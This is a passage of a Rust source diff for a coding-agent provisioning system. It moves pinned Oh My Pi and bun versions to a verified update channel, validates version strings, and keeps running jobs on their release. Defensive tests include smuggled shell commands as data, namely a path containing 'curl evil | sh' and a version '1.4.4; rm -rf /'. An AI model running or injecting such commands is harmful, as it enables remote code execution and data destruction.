@@ -56,10 +56,13 @@ pub const PROVIDER: &str = "talaria";
 /// fleet render's cont-init hook chowns it back to the runtime user.
 pub const PI_CODING_AGENT_DIR: &str = "/opt/data/workbench/harness/pi";
 
-/// The bun the coding harness runs on. omp's executable is a bun program
-/// (`#!/usr/bin/env bun`) and exits at start on a bun below its `engines.bun`.
-/// This is the harness's runtime, not the repo's toolchain (`mise.toml` decides
-/// that).
+/// The bun the coding harness runs on when this instance has verified no
+/// other (the BOOTSTRAP FALLBACK — [`Versions::bootstrap`]). omp's executable
+/// is a bun program (`#!/usr/bin/env bun`) and exits at start on a bun below
+/// its `engines.bun`. This is the harness's runtime, not the repo's toolchain
+/// (`mise.toml` decides that). The workbench harness channel
+/// (`talaria-workbench-updates`) moves it to bun's newer releases once a
+/// candidate has installed and started on a workbench.
 pub const HARNESS_BUN: &str = "1.4.4";
 
 /// mise's data dir on a Developer Agent's volume (the render sets
@@ -74,8 +77,13 @@ pub const HARNESS_XDG_DATA_HOME: &str = "/opt/data/workbench/harness/xdg";
 /// `env: 'bun': No such file or directory` when omp started.
 pub const AGENT_BIN_DIR: &str = "/opt/data/.local/bin";
 
-/// The Oh My Pi release every job runs. PINNED, and installed once per
-/// volume, never `@latest` on each run.
+/// The Oh My Pi release a job runs when this instance has verified no newer
+/// one: the BOOTSTRAP FALLBACK, not a permanent pin. The workbench harness
+/// channel (`talaria-workbench-updates`, docs/UPDATES.md) checks npm on a
+/// schedule, installs a newer release beside this one on a workbench, smoke-
+/// tests it, and only then makes it what new jobs run ([`effective`]). A job
+/// never resolves a version itself: it runs what [`effective`] names, installed
+/// once per volume, never `@latest` on each run.
 ///
 /// Every invocation line used to be `npx -y @oh-my-pi/pi-coding-agent@latest`,
 /// and omp ships almost daily. On 2026-10-28 (18.13.3) its `engines.bun` rose
@@ -84,8 +92,8 @@ pub const AGENT_BIN_DIR: &str = "/opt/data/.local/bin";
 /// `npx` on a fresh volume could also eat a whole 300 s tool call before omp
 /// printed anything. On the live fleet every Developer Agent then spent its
 /// first 13 to 75 turns finding a bun that worked and a version that started.
-/// A pin moves only when someone bumps it here and the test against
-/// [`HARNESS_BUN`] still passes.
+/// This fallback moves only when someone bumps it here and the test against
+/// [`HARNESS_BUN`] still passes; the channel moves what jobs run.
 ///
 /// Its transitive dependencies are NOT pinned by a lockfile, on purpose:
 /// omp pins every `@oh-my-pi/*` package it ships exactly, and the carets left
@@ -96,6 +104,11 @@ pub const AGENT_BIN_DIR: &str = "/opt/data/.local/bin";
 /// platform-specific optional packages (`pi-natives-*`) of whatever machine
 /// made it.
 pub const OMP_VERSION: &str = "18.16.0";
+
+/// [`OMP_VERSION`]'s own `engines.bun`, read off npm for that release: what
+/// the harness channel checks a bun move against before any check has read
+/// the bootstrap's document.
+pub const OMP_VERSION_BUN_RANGE: &str = ">=1.4.4";
 
 /// omp's npm package.
 pub const OMP_PACKAGE: &str = "@oh-my-pi/pi-coding-agent";
@@ -113,20 +126,115 @@ pub fn omp_root() -> String {
     format!("{HARNESS_ROOT}/omp")
 }
 
-/// The pinned version's path (the symlink [`omp_root`] describes).
-pub fn omp_install_dir() -> String {
-    format!("{}/{OMP_VERSION}", omp_root())
+/// A version's path (the symlink [`omp_root`] describes).
+pub fn omp_install_dir(version: &str) -> String {
+    format!("{}/{version}", omp_root())
 }
 
 /// omp's own entry point inside [`omp_install_dir`]. The launcher runs it on
 /// the harness's bun BY PATH, never through `#!/usr/bin/env bun`: inside a
 /// repo that pins its own bun, the `bun` on PATH is that repo's (a mise shim
 /// ahead of everything), and Talaria's repo pins 1.4.0, under omp's floor.
-pub fn omp_entry() -> String {
+pub fn omp_entry(version: &str) -> String {
     format!(
         "{}/node_modules/{OMP_PACKAGE}/dist/cli.js",
-        omp_install_dir()
+        omp_install_dir(version)
     )
+}
+
+/// The versions a provision installs and runs: the harness's own bun and the
+/// Oh My Pi release. Every script below takes them, so a job's launcher names
+/// the exact install it was provisioned on and keeps it until it ends.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Versions {
+    pub bun: String,
+    pub omp: String,
+}
+
+impl Versions {
+    /// The compiled fallback ([`HARNESS_BUN`], [`OMP_VERSION`]): what a job
+    /// runs when nothing newer has been verified here.
+    pub fn bootstrap() -> Versions {
+        Versions {
+            bun: HARNESS_BUN.into(),
+            omp: OMP_VERSION.into(),
+        }
+    }
+
+    /// Both versions are plain `x.y.z` — the only shape that may reach a
+    /// script. Anything else (a range, a tag, a hostile string from a
+    /// registry) is refused before it is ever written into one.
+    pub fn plain(&self) -> bool {
+        plain_version(&self.bun) && plain_version(&self.omp)
+    }
+}
+
+/// A plain release number: `x.y.z`, digits only, no leading zeros beyond a
+/// lone `0`, each part under ten digits.
+pub fn plain_version(v: &str) -> bool {
+    let parts: Vec<&str> = v.split('.').collect();
+    parts.len() == 3
+        && parts.iter().all(|p| {
+            !p.is_empty()
+                && p.len() < 10
+                && p.bytes().all(|c| c.is_ascii_digit())
+                && (p.len() == 1 || !p.starts_with('0'))
+        })
+}
+
+/// The `app_settings` key the workbench harness channel keeps its state
+/// under (`talaria-workbench-updates` writes it; provisioning reads it).
+pub const CHANNEL_STATE_KEY: &str = "workbench_harness_channel";
+
+/// What provisioning installs: the pair the channel last verified on a
+/// workbench (`current`), else the bootstrap fallback; and the pair before it
+/// (`previous`), which a volume falls back to when the current one will not
+/// install there.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Effective {
+    pub target: Versions,
+    pub fallback: Option<Versions>,
+    /// Where `target` came from: `verified` (the channel's) or `bootstrap`.
+    pub source: &'static str,
+}
+
+/// [`Effective`] from the channel's stored state (`None`, unreadable, or a
+/// version that is not plain all read as the bootstrap). Pure.
+pub fn effective_from(state: Option<&Value>) -> Effective {
+    let pair = |key: &str| -> Option<Versions> {
+        let p = state?.get(key)?;
+        let v = Versions {
+            bun: p.get("bun")?.as_str()?.to_string(),
+            omp: p.get("omp")?.as_str()?.to_string(),
+        };
+        v.plain().then_some(v)
+    };
+    match pair("current") {
+        Some(target) => {
+            let fallback = pair("previous").filter(|p| *p != target);
+            Effective {
+                target,
+                fallback,
+                source: "verified",
+            }
+        }
+        None => Effective {
+            target: Versions::bootstrap(),
+            fallback: None,
+            source: "bootstrap",
+        },
+    }
+}
+
+/// What a provision on this instance installs now. Never a registry call:
+/// a job runs only what the channel verified, or the bootstrap fallback.
+pub async fn effective(pg: &PgPool) -> Effective {
+    let stored: Option<Value> = sqlx::query_scalar("select value from app_settings where key = $1")
+        .bind(CHANNEL_STATE_KEY)
+        .fetch_optional(pg)
+        .await
+        .unwrap_or(None);
+    effective_from(stored.as_ref())
 }
 
 /// One harness directory per job, beside nothing another job uses.
@@ -139,11 +247,11 @@ pub fn omp_entry() -> String {
 /// it found — TALA-93 ran on the dir made for TALA-92.
 pub const JOB_HARNESS_ROOT: &str = "/opt/data/workbench/harness/jobs";
 
-/// Is `name` a harness slot: a job uuid (hyphenated, lowercase hex) or
-/// doctor's own [`DOCTOR_SLOT`]? Everything that builds a slot path goes
+/// Is `name` a harness slot: a job uuid (hyphenated, lowercase hex),
+/// doctor's own [`DOCTOR_SLOT`] or the channel's [`UPDATE_SLOT`]? Everything that builds a slot path goes
 /// through this, because teardown hands the path to `rm -rf`.
 pub fn valid_slot(name: &str) -> bool {
-    if name == DOCTOR_SLOT {
+    if name == DOCTOR_SLOT || name == UPDATE_SLOT {
         return true;
     }
     let b = name.as_bytes();
@@ -173,6 +281,11 @@ pub fn job_launcher(name: &str) -> Option<String> {
 /// The harness's slot in [`job_harness_dir`] that doctor probes through.
 pub const DOCTOR_SLOT: &str = "doctor";
 
+/// The slot the harness channel smoke-tests a candidate through: the same
+/// layout and launcher a job gets, standing in the workbench root, so a
+/// candidate passes only if a job's launcher would start it.
+pub const UPDATE_SLOT: &str = "update-check";
+
 /// Where the render leaves the files omp reads, live: a DIRECTORY bind of the
 /// agent's workbench render dir, so a re-render reaches a running container.
 /// A job's agent dir links to these rather than copying them.
@@ -192,15 +305,20 @@ pub const WORKBENCH_CONFIG_DIR: &str = "/opt/workbench-config";
 /// earlier step put bun there. Before this, bun appeared only after a
 /// prepare_env on a cloned repo, so a fresh Developer Agent's doctor, and every
 /// non-login shell, found no bun and omp could not start.
-pub fn harness_runtime_script() -> String {
-    runtime_script_for(HARNESS_XDG_DATA_HOME, AGENT_BIN_DIR, HARNESS_ROOT)
+///
+/// `v` is what to install and start: [`effective`]'s target for a provision,
+/// a candidate for the harness channel's smoke test. Never a range or a tag
+/// (`None` unless both are [`plain_version`]s).
+pub fn harness_runtime_script(v: &Versions) -> Option<String> {
+    v.plain()
+        .then(|| runtime_script_for(HARNESS_XDG_DATA_HOME, AGENT_BIN_DIR, HARNESS_ROOT, v))
 }
 
 /// [`harness_runtime_script`] against other roots — the script the tests run
 /// for real, under a temp dir, with a stand-in bun.
-fn runtime_script_for(xdg: &str, bin: &str, harness_root: &str) -> String {
+fn runtime_script_for(xdg: &str, bin: &str, harness_root: &str, v: &Versions) -> String {
     let root = format!("{harness_root}/omp");
-    let link = format!("{root}/{OMP_VERSION}");
+    let link = format!("{root}/{}", v.omp);
     let entry = format!("{link}/node_modules/{OMP_PACKAGE}/dist/cli.js");
     r#"set -eu
 export XDG_DATA_HOME="__XDG__" MISE_YES=1
@@ -307,9 +425,12 @@ if ! started; then
       echo "could not install Oh My Pi __OMPV__ (bun install, above)" >&2
       exit 1
     fi
-    if ! "$real" "$new/node_modules/__PKG__/dist/cli.js" --version 2>/dev/null | grep -qx "omp/__OMPV__"; then
+    # What it printed when it would not start is the reason an admin reads
+    # (omp's own `Bun runtime must be >= …` line), so it is kept.
+    if ! said=$("$real" "$new/node_modules/__PKG__/dist/cli.js" --version 2>&1) \
+      || ! printf '%s\n' "$said" | grep -qx "omp/__OMPV__"; then
       rm -rf "$new"
-      echo "Oh My Pi __OMPV__ installed but does not start on bun __BUN__" >&2
+      echo "Oh My Pi __OMPV__ installed but does not start on bun __BUN__: $(printf '%s' "$said" | tail -n 3)" >&2
       exit 1
     fi
     # An install from before installs were swapped is a real directory at the
@@ -320,7 +441,11 @@ if ! started; then
       mv "$link" "$aside"
       touch "$aside/.retired"
     fi
-    old="$(readlink -f "$link" 2>/dev/null || true)"
+    # Only an install the link already names is swapped OUT: on a version's
+    # first install there is none, and `readlink -f` of the missing link
+    # would name the link itself, stamping the new install retired.
+    old=""
+    if [ -L "$link" ]; then old="$(readlink -f "$link" 2>/dev/null || true)"; fi
     ln -s "$new" "$link.tmp.$$"
     mv -T "$link.tmp.$$" "$link"
     # The install just swapped out is retired NOW, however old it is: a job
@@ -332,8 +457,12 @@ if ! started; then
 fi
 # Prune: an install retired (swapped out, moved aside, or found not current)
 # more than two days ago — its `.retired` stamp, never the install's own age,
-# which says nothing about whether a job still runs it — and that no running
-# process maps (omp's native addon and chunks are mapped from its own dir).
+# which says nothing about whether a job still runs it — that no running
+# process maps (omp's native addon and chunks are mapped from its own dir),
+# and that no job still holds: a job's launcher names the version link it was
+# provisioned on (`omp/<v>/…`), and its teardown removes that launcher when
+# the job ends, so a job that started on an older release keeps it however
+# long it runs, while new jobs start on the newer one.
 # One not current and not yet stamped is stamped now: its clock starts here.
 # Then any version link left dangling.
 cur="$(readlink -f "$link" 2>/dev/null || true)"
@@ -346,6 +475,12 @@ for d in "$root"/.[0-9]*; do
   fi
   [ -n "$(find "$d/.retired" -maxdepth 0 -mmin -__RETIRE_MIN__ 2>/dev/null)" ] && continue
   grep -qsF "$d/" /proc/[0-9]*/maps 2>/dev/null && continue
+  held=""
+  for l in "$root"/*; do
+    [ -L "$l" ] && [ "$(readlink -f "$l")" = "$d" ] || continue
+    if grep -qsF "$l/" "__JOBS__"/*-*-*-*-*/omp 2>/dev/null; then held=1; break; fi
+  done
+  [ -n "$held" ] && continue
   rm -rf "$d"
 done
 for l in "$root"/*; do
@@ -362,14 +497,15 @@ echo "bunPath $real"
 "#
     .replace("__XDG__", xdg)
     .replace("__BIN__", bin)
-    .replace("__BUN__", HARNESS_BUN)
+    .replace("__BUN__", &v.bun)
+    .replace("__JOBS__", &format!("{harness_root}/jobs"))
     .replace("__OMPROOT__", &root)
     .replace("__OMPDIR__", &link)
     .replace("__ENTRY__", &entry)
     .replace("__LOCKWAIT__", &INSTALL_LOCK_WAIT_SECS.to_string())
     .replace("__LOCKSTALE__", &PIDLESS_LOCK_STALE_SECS.to_string())
     .replace("__RETIRE_MIN__", &RETIRED_KEEP_MINS.to_string())
-    .replace("__OMPV__", OMP_VERSION)
+    .replace("__OMPV__", &v.omp)
     .replace("__PKG__", OMP_PACKAGE)
     .replace("__HROOT__", harness_root)
 }
@@ -397,6 +533,21 @@ pub struct Runtime {
     pub omp: String,
     /// The real bun binary the launcher execs — never the PATH's `bun`.
     pub bun_path: String,
+}
+
+impl Runtime {
+    /// The Oh My Pi release this runtime answered (`omp/<v>` → `<v>`).
+    pub fn omp_version(&self) -> &str {
+        self.omp.strip_prefix("omp/").unwrap_or(&self.omp)
+    }
+
+    /// The pair this runtime runs.
+    pub fn versions(&self) -> Versions {
+        Versions {
+            bun: self.bun.clone(),
+            omp: self.omp_version().to_string(),
+        }
+    }
 }
 
 /// Read the runtime script's three lines. `None` when any is missing: the
@@ -459,7 +610,9 @@ pub const LAUNCHER_REFUSED: i32 = 78;
 /// A job's launcher: the whole harness, as one command.
 ///
 /// `name` is the job's slot ([`job_harness_dir`]), `workdir` its checkout,
-/// `bun_path` the harness's real bun ([`Runtime::bun_path`]), and `gateway`
+/// `rt` the runtime provisioned for it (its real bun, by path, and the omp
+/// release it answered — the launcher names exactly that install, so a newer
+/// release adopted later never moves a job already running), and `gateway`
 /// whether the job's harness authenticates to the Talaria gateway (a coding
 /// account's does not, so it needs no workbench key).
 ///
@@ -470,8 +623,12 @@ pub const LAUNCHER_REFUSED: i32 = 78;
 /// [`LAUNCHER_REFUSED`], one sentence — when the gateway key is absent from
 /// the shell, rather than letting omp start and answer `401` or a missing
 /// model after the agent has already spent a turn on it.
-pub fn launcher_script(name: &str, workdir: &str, bun_path: &str, gateway: bool) -> Option<String> {
-    launcher_script_with(name, workdir, bun_path, gateway, &omp_entry())
+pub fn launcher_script(name: &str, workdir: &str, rt: &Runtime, gateway: bool) -> Option<String> {
+    let v = rt.versions();
+    if !plain_version(&v.omp) {
+        return None;
+    }
+    launcher_script_with(name, workdir, &rt.bun_path, gateway, &omp_entry(&v.omp), &v)
 }
 
 /// [`launcher_script`] for another omp entry — the launcher the tests run.
@@ -481,6 +638,7 @@ fn launcher_script_with(
     bun_path: &str,
     gateway: bool,
     entry: &str,
+    v: &Versions,
 ) -> Option<String> {
     let agent = job_agent_dir(name)?;
     let key_check = if gateway {
@@ -494,7 +652,7 @@ fn launcher_script_with(
     };
     Some(format!(
         "#!/bin/sh\n\
-         # Oh My Pi {OMP_VERSION} on bun {HARNESS_BUN} for workbench job {name}.\n\
+         # Oh My Pi {omp} on bun {bunv} for workbench job {name}.\n\
          # Written by Talaria's provisioning and rewritten on every provision: do not edit it,\n\
          # copy it, or wrap it. Its arguments go to omp as given.\n\
          export PI_CODING_AGENT_DIR={agent}\n\
@@ -505,7 +663,7 @@ fn launcher_script_with(
          {key_check}\
          cd {workdir} || {{ echo \"talaria: this job's checkout ({workdir}) is not there — call prepare_env, which provisions this job again\" >&2; exit {code}; }}\n\
          if [ -f .talaria/env ]; then set -a; . ./.talaria/env; set +a; fi\n\
-         [ -f {entry} ] || {{ echo \"talaria: Oh My Pi {OMP_VERSION} is not installed here any more — call prepare_env, which provisions this job again\" >&2; exit {code}; }}\n\
+         [ -f {entry} ] || {{ echo \"talaria: Oh My Pi {omp} is not installed here any more — call prepare_env, which provisions this job again\" >&2; exit {code}; }}\n\
          exec {bun} {entry} \"$@\"\n",
         agent = sh_quote(&agent),
         workdir = sh_quote(workdir),
@@ -513,6 +671,8 @@ fn launcher_script_with(
         entry = sh_quote(entry),
         code = LAUNCHER_REFUSED,
         xdg = HARNESS_XDG_DATA_HOME,
+        omp = v.omp,
+        bunv = v.bun,
     ))
 }
 
@@ -559,11 +719,12 @@ echo "OK $v"
 
 /// [`PREFLIGHT_SH`] with its constants filled; `bun_path` runs the gateway
 /// check (curl is not promised by every image, bun is: it was just
-/// provisioned).
-pub fn preflight_script(bun_path: &str) -> String {
+/// provisioned), and `omp_version` is the release the launcher must answer
+/// (the one just provisioned).
+pub fn preflight_script(bun_path: &str, omp_version: &str) -> String {
     PREFLIGHT_SH
         .replace("__KEY__", WORKBENCH_KEY_ENV)
-        .replace("__OMPV__", OMP_VERSION)
+        .replace("__OMPV__", omp_version)
         .replace("__BUN__", bun_path)
 }
 
@@ -924,11 +1085,30 @@ mod tests {
 
     const JOB: &str = "11111111-2222-4333-8444-555555555555";
 
+    /// A runtime as the runtime script answers it, on the bootstrap pair.
+    fn rt(bun_path: &str) -> Runtime {
+        Runtime {
+            bun: HARNESS_BUN.into(),
+            omp: format!("omp/{OMP_VERSION}"),
+            bun_path: bun_path.into(),
+        }
+    }
+
     // The pinned omp release's `engines.bun`, read off npm FOR THAT RELEASE
     // (`npm view @oh-my-pi/pi-coding-agent@<v> engines`). Tied to the version
     // it was read for: bumping OMP_VERSION fails here until the floor is
     // re-read, so a release whose floor outruns HARNESS_BUN cannot ship.
     const OMP_BUN_FLOOR: (&str, [u32; 3]) = ("18.16.0", [1, 4, 4]);
+
+    #[test]
+    fn the_bootstraps_declared_range_is_its_floor() {
+        let f = OMP_BUN_FLOOR.1;
+        assert_eq!(
+            OMP_VERSION_BUN_RANGE,
+            format!(">={}.{}.{}", f[0], f[1], f[2]),
+            "OMP_VERSION_BUN_RANGE is the bootstrap's engines.bun"
+        );
+    }
 
     #[test]
     fn the_pinned_bun_is_one_the_pinned_omp_will_start_on() {
@@ -949,7 +1129,7 @@ mod tests {
 
     #[test]
     fn the_runtime_script_puts_the_pinned_bun_on_every_shells_path() {
-        let s = harness_runtime_script();
+        let s = harness_runtime_script(&Versions::bootstrap()).unwrap();
         assert!(!s.contains("__"), "every placeholder is filled: {s}");
         assert!(s.contains(&format!("bun@{HARNESS_BUN}")));
         assert!(s.contains(&format!("export XDG_DATA_HOME=\"{HARNESS_XDG_DATA_HOME}\"")));
@@ -965,11 +1145,11 @@ mod tests {
 
     #[test]
     fn the_runtime_script_installs_the_pinned_omp_never_latest() {
-        let s = harness_runtime_script();
+        let s = harness_runtime_script(&Versions::bootstrap()).unwrap();
         assert!(!s.contains("@latest"), "{s}");
         assert!(!s.contains("npx"), "no per-run registry resolution: {s}");
         assert!(s.contains(&format!("\"{OMP_PACKAGE}\":\"{OMP_VERSION}\"")));
-        assert!(s.contains(&omp_install_dir()));
+        assert!(s.contains(&omp_install_dir(OMP_VERSION)));
         assert!(
             !s.contains("|| true\n  fi\n  if ! started"),
             "the lock never falls through"
@@ -1014,6 +1194,7 @@ mod tests {
             tmp.join("xdg").to_str().unwrap(),
             bin.to_str().unwrap(),
             hroot.to_str().unwrap(),
+            &Versions::bootstrap(),
         );
         let run = || {
             let out = Command::new("sh").args(["-c", &script]).output().unwrap();
@@ -1121,6 +1302,7 @@ mod tests {
             tmp.join("xdg").to_str().unwrap(),
             bin.to_str().unwrap(),
             hroot.to_str().unwrap(),
+            &Versions::bootstrap(),
         )
         .replace("command -v flock", "false");
         let lock = hroot.join("omp/.install.lock.d");
@@ -1211,7 +1393,7 @@ mod tests {
         ] {
             assert!(job_harness_dir(bad).is_none(), "{bad:?}");
             assert!(job_launcher(bad).is_none() && job_agent_dir(bad).is_none());
-            assert!(launcher_script(bad, "/w", "/b", true).is_none());
+            assert!(launcher_script(bad, "/w", &rt("/b"), true).is_none());
         }
     }
 
@@ -1220,7 +1402,7 @@ mod tests {
         let l = launcher_script(
             JOB,
             "/opt/data/workbench/jobs/abc",
-            "/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun",
+            &rt("/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun"),
             true,
         )
         .unwrap();
@@ -1233,7 +1415,7 @@ mod tests {
         // PATH can no longer be the one omp checks its floor against.
         assert!(l.contains(&format!(
             "exec /opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun {} \"$@\"",
-            omp_entry()
+            omp_entry(OMP_VERSION)
         )));
         assert!(!l.contains("env bun") && !l.contains("@latest"));
         // The repo's toolchain is on PATH for omp's own commands, absolute.
@@ -1246,7 +1428,7 @@ mod tests {
         assert!(l.contains(&format!("exit {LAUNCHER_REFUSED}")));
         // The key's NAME only, never a value, and never the personas' key.
         assert!(!l.contains("LLM_API_KEY") && !l.contains("OPENAI_API_KEY"));
-        let account = launcher_script(JOB, "/w", "/b", false).unwrap();
+        let account = launcher_script(JOB, "/w", &rt("/b"), false).unwrap();
         assert!(
             !account.contains(WORKBENCH_KEY_ENV),
             "a coding account's job needs no gateway key: {account}"
@@ -1255,7 +1437,7 @@ mod tests {
 
     #[test]
     fn a_hostile_path_cannot_break_out_of_the_launcher() {
-        let l = launcher_script(JOB, "/w; curl evil | sh", "/b", false).unwrap();
+        let l = launcher_script(JOB, "/w; curl evil | sh", &rt("/b"), false).unwrap();
         assert!(l.contains("cd '/w; curl evil | sh' ||"), "{l}");
     }
 
@@ -1279,7 +1461,7 @@ mod tests {
 
     #[test]
     fn the_preflight_checks_what_the_live_fleet_tripped_on_without_a_model_call() {
-        let s = preflight_script("/b/bun");
+        let s = preflight_script("/b/bun", OMP_VERSION);
         assert!(!s.contains("__"), "{s}");
         for check in [
             "launcher", "key", "version", "writable", "models", "gateway",
@@ -1329,6 +1511,7 @@ mod tests {
             bun.to_str().unwrap(),
             true,
             entry.to_str().unwrap(),
+            &Versions::bootstrap(),
         )
         .unwrap();
         script(&launcher, text.trim_start_matches("#!/bin/sh\n"));
@@ -1452,11 +1635,15 @@ mod tests {
         script(&gw401, "echo 401");
         let run = |launcher: &std::path::Path, model: &str, bun: &std::path::Path, key: bool| {
             let mut cmd = Command::new("bash");
-            cmd.args(["-c", &preflight_script(bun.to_str().unwrap()), "bash"])
-                .arg(launcher)
-                .arg(&agent)
-                .arg(model)
-                .arg("SOME_STRIPPED_NAME");
+            cmd.args([
+                "-c",
+                &preflight_script(bun.to_str().unwrap(), OMP_VERSION),
+                "bash",
+            ])
+            .arg(launcher)
+            .arg(&agent)
+            .arg(model)
+            .arg("SOME_STRIPPED_NAME");
             if key {
                 cmd.env(WORKBENCH_KEY_ENV, "k");
             } else {
@@ -1743,5 +1930,218 @@ mod tests {
         };
         assert_eq!(roles.model_ids(), vec!["mid", "fast", "deep"]);
         assert!(OmpRoles::default().model_ids().is_empty());
+    }
+
+    #[test]
+    fn a_job_runs_what_the_channel_verified_else_the_bootstrap_never_a_range() {
+        let boot = effective_from(None);
+        assert_eq!(boot.target, Versions::bootstrap());
+        assert_eq!((boot.source, boot.fallback), ("bootstrap", None));
+        let st = json!({
+            "current": { "bun": "1.4.5", "omp": "18.17.0" },
+            "previous": { "bun": "1.4.4", "omp": "18.16.0" },
+        });
+        let e = effective_from(Some(&st));
+        assert_eq!(e.source, "verified");
+        assert_eq!(
+            e.target,
+            Versions {
+                bun: "1.4.5".into(),
+                omp: "18.17.0".into()
+            }
+        );
+        assert_eq!(e.fallback, Some(Versions::bootstrap()));
+        // Whatever is stored, only a plain x.y.z ever reaches a script.
+        for hostile in ["latest", ">=1.4.4", "1.4", "1.4.4; rm -rf /", "01.4.4", ""] {
+            let st = json!({ "current": { "bun": hostile, "omp": "18.17.0" } });
+            assert_eq!(
+                effective_from(Some(&st)).target,
+                Versions::bootstrap(),
+                "{hostile:?}"
+            );
+            let v = Versions {
+                bun: hostile.into(),
+                omp: "18.17.0".into(),
+            };
+            assert!(harness_runtime_script(&v).is_none(), "{hostile:?}");
+        }
+        assert!(plain_version("0.22.10") && plain_version("1.4.4"));
+        // An unreadable row is the bootstrap too, never an error that stops a job.
+        assert_eq!(
+            effective_from(Some(&json!("garbage"))).target,
+            Versions::bootstrap()
+        );
+    }
+
+    #[test]
+    fn the_runtime_script_installs_the_versions_it_is_given() {
+        let v = Versions {
+            bun: "1.4.5".into(),
+            omp: "18.17.0".into(),
+        };
+        let s = harness_runtime_script(&v).unwrap();
+        assert!(s.contains("bun@1.4.5") && !s.contains(&format!("bun@{HARNESS_BUN}")));
+        assert!(s.contains(&format!("\"{OMP_PACKAGE}\":\"18.17.0\"")));
+        assert!(s.contains(&omp_install_dir("18.17.0")));
+        assert!(!s.contains("@latest") && !s.contains("__"), "{s}");
+    }
+
+    /// A stand-in bun that knows versions: an install writes the version the
+    /// package.json asks for into cli.js, and cli.js answers it.
+    #[cfg(unix)]
+    fn versioned_bun(dir: &std::path::Path, bun_version: &str) -> std::path::PathBuf {
+        let bun = dir.join("vbun");
+        script(
+            &bun,
+            &format!(
+                "if [ \"$1\" = --version ]; then echo {bun_version}; exit 0; fi\n\
+                 if [ \"$1\" = install ]; then v=$(sed -n 's|.*\"{OMP_PACKAGE}\":\"\\([0-9.]*\\)\".*|\\1|p' package.json); mkdir -p node_modules/{OMP_PACKAGE}/dist; echo \"$v\" > node_modules/{OMP_PACKAGE}/dist/cli.js; exit 0; fi\n\
+                 if [ \"$2\" = --version ] && [ -f \"$1\" ]; then echo \"omp/$(cat \"$1\")\"; exit 0; fi\n\
+                 exit 1"
+            ),
+        );
+        bun
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_running_job_keeps_the_release_it_started_on_until_it_ends() {
+        use std::process::Command;
+        let tmp = scratch("upgrade");
+        let bin = tmp.join("bin");
+        let hroot = tmp.join("harness");
+        let work = tmp.join("work");
+        std::fs::create_dir_all(&bin).unwrap();
+        std::fs::create_dir_all(&work).unwrap();
+        let bun = versioned_bun(&tmp, HARNESS_BUN);
+        std::os::unix::fs::symlink(&bun, bin.join("bun")).unwrap();
+        let old = Versions {
+            bun: HARNESS_BUN.into(),
+            omp: "18.15.0".into(),
+        };
+        let new = Versions {
+            bun: HARNESS_BUN.into(),
+            omp: "18.16.0".into(),
+        };
+        let run = |v: &Versions| {
+            let script = runtime_script_for(
+                tmp.join("xdg").to_str().unwrap(),
+                bin.to_str().unwrap(),
+                hroot.to_str().unwrap(),
+                v,
+            );
+            let out = Command::new("sh").args(["-c", &script]).output().unwrap();
+            assert!(
+                out.status.success(),
+                "{}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+            parse_runtime(&String::from_utf8_lossy(&out.stdout)).expect("three lines")
+        };
+        assert_eq!(run(&old).omp, "omp/18.15.0");
+        let old_dir = std::fs::canonicalize(hroot.join("omp/18.15.0")).unwrap();
+        assert!(
+            !old_dir.join(".retired").exists(),
+            "a version's first install is current, not retired"
+        );
+        // A job provisioned on the old release: its launcher, where
+        // provisioning writes it, names that release's link.
+        let lay = |slot: &str| {
+            let dir = hroot.join("jobs").join(slot);
+            std::fs::create_dir_all(&dir).unwrap();
+            let entry = hroot.join(format!(
+                "omp/18.15.0/node_modules/{OMP_PACKAGE}/dist/cli.js"
+            ));
+            let text = launcher_script_with(
+                JOB,
+                work.to_str().unwrap(),
+                bun.to_str().unwrap(),
+                false,
+                entry.to_str().unwrap(),
+                &old,
+            )
+            .unwrap();
+            script(&dir.join("omp"), text.trim_start_matches("#!/bin/sh\n"));
+            dir
+        };
+        let job = lay(JOB);
+        // The channel adopts a newer release: new jobs start on it.
+        let rt = run(&new);
+        assert_eq!(rt.omp, "omp/18.16.0");
+        assert_eq!(rt.versions(), new);
+        assert!(
+            old_dir.join(".retired").exists(),
+            "the old release is retired now"
+        );
+        // Two days on, the old release is still the running job's: kept, and
+        // its launcher still starts it, not the new one.
+        let ok = Command::new("touch")
+            .args(["-d", "3 days ago"])
+            .arg(old_dir.join(".retired"))
+            .status()
+            .unwrap();
+        assert!(ok.success());
+        run(&new);
+        assert!(old_dir.exists(), "a job still holds it");
+        let said = Command::new(job.join("omp"))
+            .arg("--version")
+            .output()
+            .unwrap();
+        assert_eq!(String::from_utf8_lossy(&said.stdout).trim(), "omp/18.15.0");
+        // doctor's slot is not a job: a launcher it left there holds nothing.
+        lay(DOCTOR_SLOT);
+        // The job ends (teardown removes its harness dir): the old release goes.
+        std::fs::remove_dir_all(&job).unwrap();
+        run(&new);
+        assert!(!old_dir.exists(), "pruned once no job holds it");
+        assert!(!hroot.join("omp/18.15.0").exists(), "and its dangling link");
+        assert!(hroot.join("omp/18.16.0").exists());
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_release_that_will_not_start_says_what_it_printed_and_leaves_nothing() {
+        use std::process::Command;
+        let tmp = scratch("nostart");
+        let bin = tmp.join("bin");
+        let hroot = tmp.join("harness");
+        std::fs::create_dir_all(&bin).unwrap();
+        // omp 18.13.3's own refusal, on a bun under its floor.
+        let bun = tmp.join("oldbun");
+        script(
+            &bun,
+            &format!(
+                "if [ \"$1\" = --version ]; then echo 1.3.14; exit 0; fi\n\
+                 if [ \"$1\" = install ]; then mkdir -p node_modules/{OMP_PACKAGE}/dist; : > node_modules/{OMP_PACKAGE}/dist/cli.js; exit 0; fi\n\
+                 echo 'error: Bun runtime must be >= 1.4.4 (found v1.3.14)' >&2; exit 1"
+            ),
+        );
+        std::os::unix::fs::symlink(&bun, bin.join("bun")).unwrap();
+        let v = Versions {
+            bun: "1.3.14".into(),
+            omp: "18.16.0".into(),
+        };
+        let script = runtime_script_for(
+            tmp.join("xdg").to_str().unwrap(),
+            bin.to_str().unwrap(),
+            hroot.to_str().unwrap(),
+            &v,
+        );
+        let out = Command::new("sh").args(["-c", &script]).output().unwrap();
+        assert!(!out.status.success());
+        let err = String::from_utf8_lossy(&out.stderr);
+        assert!(
